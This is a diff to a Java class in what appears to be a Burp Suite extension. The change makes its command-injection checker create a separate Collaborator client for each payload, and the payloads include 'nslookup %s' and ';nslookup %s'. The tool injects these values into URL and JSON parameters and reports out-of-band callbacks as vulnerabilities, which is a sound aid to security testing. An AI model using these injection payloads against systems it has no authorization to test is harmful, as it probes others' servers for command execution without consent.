@@ -14,16 +14,12 @@ import org.json.JSONException;
 import whoami.core.CoreModules;
 
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class CMDInjectionChecker {
     private final CoreModules core;
-    private final CollaboratorClient collaboratorClient;
-    private final String collaboratorPayload;
     private static final String[] COMMAND_INJECTION_PAYLOADS = {
         "nslookup %s",
         ";nslookup %s",
@@ -37,8 +33,21 @@ public class CMDInjectionChecker {
 
     public CMDInjectionChecker(CoreModules core) {
         this.core = core;
-        this.collaboratorClient = core.getApi().collaborator().createClient();
-        this.collaboratorPayload = collaboratorClient.generatePayload().toString();
+    }
+
+    // Metadata class to store client, parameter, payload, and response
+    private static class PayloadMetadata {
+        final CollaboratorClient client;
+        final String parameter;
+        final String payload;
+        final HttpRequestResponse response;
+
+        PayloadMetadata(CollaboratorClient client, String parameter, String payload, HttpRequestResponse response) {
+            this.client = client;
+            this.parameter = parameter;
+            this.payload = payload;
+            this.response = response;
+        }
     }
 
     public void checkForCMDi(HttpRequest request) {
@@ -52,7 +61,7 @@ public class CMDInjectionChecker {
 
         // Handle standard parameters
         boolean hasStandardParameters = false;
-        Map<String, HttpRequestResponse> payloadResponseMap = new HashMap<>();
+        List<PayloadMetadata> metadataList = new ArrayList<>();
         for (HttpParameter parameter : request.parameters()) {
             if (parameter.type() == HttpParameterType.JSON) {
                 core.logger.log("CMDi", "Skipping JSON parameter: " + parameter.name());
@@ -69,13 +78,16 @@ public class CMDInjectionChecker {
             HttpParameterType type = parameter.type();
 
             for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
-                String payload = String.format(payloadTemplate, collaboratorPayload);
+                // Create new Collaborator client and payload
+                CollaboratorClient client = core.getApi().collaborator().createClient();
+                String uniqueCollaboratorPayload = client.generatePayload().toString();
+                String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
                 String encodedPayload = core.getApi().utilities().urlUtils().encode(payload);
                 HttpParameter paramWithPayload = HttpParameter.parameter(name, value + encodedPayload, type);
                 HttpRequest req = request.withUpdatedParameters(paramWithPayload);
-                core.logger.log("CMDi", "Sending encoded payload for parameter: " + name + ", Payload: " + payload);
+                core.logger.log("CMDi", "Sending encoded payload for parameter: " + name + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                 HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
-                payloadResponseMap.put(name + ":" + payload, resp);
+                metadataList.add(new PayloadMetadata(client, name, payload, resp));
 
                 // Check for 500 Internal Server Error
                 if (resp.response() != null && resp.response().statusCode() == 500) {
@@ -89,32 +101,28 @@ public class CMDInjectionChecker {
                     core.getApi().siteMap().add(resp.withAnnotations(annotations));
                 }
             }
+        }
 
-            // Wait for potential Collaborator interactions (5 seconds)
-            try {
-                Thread.sleep(5000);
-            } catch (InterruptedException e) {
-                core.logger.logError("CMDi", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
-            }
+        // Wait for potential Collaborator interactions (5 seconds)
+        try {
+            Thread.sleep(5000);
+        } catch (InterruptedException e) {
+            core.logger.logError("CMDi", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
+        }
 
-            // Check for DNS or HTTP interactions
-            List<Interaction> interactions = collaboratorClient.getAllInteractions();
+        // Check for interactions in each client
+        for (PayloadMetadata metadata : metadataList) {
+            List<Interaction> interactions = metadata.client.getAllInteractions();
             if (!interactions.isEmpty()) {
-                for (String key : payloadResponseMap.keySet()) {
-                    String[] parts = key.split(":", 2);
-                    String paramName = parts[0];
-                    String payload = parts[1];
-                    HttpRequestResponse resp = payloadResponseMap.get(key);
-                    core.logger.log("CMDi", "[VULNERABLE] Command Injection found for parameter: " + paramName + " with payload: " + payload);
-                    Annotations annotations = Annotations.annotations()
-                            .withHighlightColor(HighlightColor.RED)
-                            .withNotes("Command Injection found in parameter: " + paramName + "\n" +
-                                       "Payload: " + payload + "\n" +
-                                       "Encoded Payload: " + core.getApi().utilities().urlUtils().encode(payload) + "\n" +
-                                       "Collaborator interaction detected, indicating command execution.\n" +
-                                       "Interaction details: " + interactions.get(0).type().toString());
-                    core.getApi().siteMap().add(resp.withAnnotations(annotations));
-                }
+                core.logger.log("CMDi", "[VULNERABLE] Command Injection found for parameter: " + metadata.parameter + " with payload: " + metadata.payload);
+                Annotations annotations = Annotations.annotations()
+                        .withHighlightColor(HighlightColor.RED)
+                        .withNotes("Command Injection found in parameter: " + metadata.parameter + "\n" +
+                                   "Payload: " + metadata.payload + "\n" +
+                                   "Encoded Payload: " + core.getApi().utilities().urlUtils().encode(metadata.payload) + "\n" +
+                                   "Collaborator interaction detected, indicating command execution.\n" +
+                                   "Interaction details: " + interactions.get(0).type().toString());
+                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
             }
         }
 
@@ -214,14 +222,17 @@ public class CMDInjectionChecker {
     private void testJsonPath(String path, String url, HttpRequest originalRequest, boolean bypassDelay, String... stringValue) {
         String value = stringValue.length > 0 ? stringValue[0] : "";
         JSONObject modifiedJson = new JSONObject(originalRequest.bodyToString());
-        Map<String, HttpRequestResponse> payloadResponseMap = new HashMap<>();
+        List<PayloadMetadata> metadataList = new ArrayList<>();
         for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
-            String payload = String.format(payloadTemplate, collaboratorPayload);
+            // Create new Collaborator client and payload
+            CollaboratorClient client = core.getApi().collaborator().createClient();
+            String uniqueCollaboratorPayload = client.generatePayload().toString();
+            String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
             if (setJsonValue(modifiedJson, path, value + payload)) {
                 HttpRequest req = originalRequest.withBody(modifiedJson.toString());
-                core.logger.log("JSON", "Sending raw CMDi payload for: " + path + ", Payload: " + payload);
+                core.logger.log("JSON", "Sending raw CMDi payload for: " + path + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                 HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
-                payloadResponseMap.put(path + ":" + payload, resp);
+                metadataList.add(new PayloadMetadata(client, path, payload, resp));
 
                 // Check for 500 Internal Server Error
                 if (resp.response() != null && resp.response().statusCode() == 500) {
@@ -245,22 +256,18 @@ public class CMDInjectionChecker {
             core.logger.logError("JSON", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
         }
 
-        // Check for DNS or HTTP interactions
-        List<Interaction> interactions = collaboratorClient.getAllInteractions();
-        if (!interactions.isEmpty()) {
-            for (String key : payloadResponseMap.keySet()) {
-                String[] parts = key.split(":", 2);
-                String paramPath = parts[0];
-                String payload = parts[1];
-                HttpRequestResponse resp = payloadResponseMap.get(key);
-                core.logger.log("JSON", "[VULNERABLE] Command Injection found for JSON parameter: " + paramPath + " with payload: " + payload);
+        // Check for interactions in each client
+        for (PayloadMetadata metadata : metadataList) {
+            List<Interaction> interactions = metadata.client.getAllInteractions();
+            if (!interactions.isEmpty()) {
+                core.logger.log("JSON", "[VULNERABLE] Command Injection found for JSON parameter: " + metadata.parameter + " with payload: " + metadata.payload);
                 Annotations annotations = Annotations.annotations()
                         .withHighlightColor(HighlightColor.RED)
-                        .withNotes("Command Injection found in JSON parameter: " + paramPath + "\n" +
-                                   "Payload: " + payload + "\n" +
+                        .withNotes("Command Injection found in JSON parameter: " + metadata.parameter + "\n" +
+                                   "Payload: " + metadata.payload + "\n" +
                                    "Collaborator interaction detected, indicating command execution.\n" +
                                    "Interaction details: " + interactions.get(0).type().toString());
-                core.getApi().siteMap().add(resp.withAnnotations(annotations));
+                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
             }
         }
     }
